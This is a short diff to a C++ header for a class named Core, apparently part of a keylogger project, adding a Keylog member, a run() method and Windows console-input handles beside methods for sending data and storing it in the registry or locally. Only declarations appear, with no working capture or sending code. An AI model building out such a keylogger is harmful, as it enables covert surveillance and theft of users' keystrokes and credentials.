@@ -14,6 +14,8 @@
 #include <iostream>
 #include <fstream>
 
+#include "Keylog.hh"
+
 class Core
 {
 public:
@@ -22,11 +24,20 @@ public:
 	int	sendData(const std::string &);
 	int	storeInReg(const std::string &);
 	int	storeLocally(const std::string &);
+	int	run();
 
 private:
 	std::string	msgReceived;
 	std::string	msgToSent;
 	bool		cmdBreak;
+
+	Keylog keylog;
+
+	// Read Console Input
+	HANDLE	hIn;
+	HANDLE	hOut;
+	INPUT_RECORD InRec;
+	DWORD NumRead;
 
 };
 
